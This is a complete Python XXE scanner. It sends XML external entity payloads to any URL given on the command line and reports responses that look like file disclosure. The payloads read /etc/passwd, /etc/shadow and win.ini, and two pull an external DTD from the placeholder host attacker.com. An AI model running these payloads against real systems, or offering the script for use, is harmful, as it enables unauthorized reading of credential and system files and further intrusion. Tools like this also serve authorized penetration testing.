#!/usr/bin/env python3
"""
XXE Scanner
Usage: python xml_injection.py https://target.com/upload
"""

import sys
import requests
import urllib.parse

class XXEScanner:
    def __init__(self, url):
        self.url = url
        self.findings = []
        
        # XXE payloads
        self.payloads = [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>',
            '''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>''',
            '''<?xml version="1.0"?>
<!DOCTYPE r [
<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
%dtd;
]>
<foo>&xxe;</foo>''',
            '<?xml version="1.0" encoding="utf-8"?><!DOCTYPE foo [<!ENTITY bar "test"><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        ]
    
    def test_payload(self, payload):
        """Test XXE"""
        try:
            headers = {'Content-Type': 'application/xml'}
            r = requests.post(self.url, data=payload, headers=headers, timeout=10)
            
            # Check for XXE indicators
            if 'root:' in r.text or 'www-data' in r.text:
                return {'payload': payload, 'type': 'File disclosure'}
            
            if 'failed to parse' in r.text.lower():
                return {'payload': payload, 'type': 'Parse error'}
            
        except Exception as e:
            pass
        
        return None
    
    def scan(self):
        """Scan for XXE"""
        print(f"[*] Scanning {self.url}...")
        
        for payload in self.payloads:
            result = self.test_payload(payload)
            if result:
                print(f"[!] XXE: {result['type']}")
                self.findings.append(result)
        
        return self.findings


def main():
    if len(sys.argv) < 2:
        print("Usage: python xml_injection.py <url>")
        sys.exit(1)
    
    url = sys.argv[1]
    scanner = XXEScanner(url)
    scanner.scan()


if __name__ == "__main__":
    main()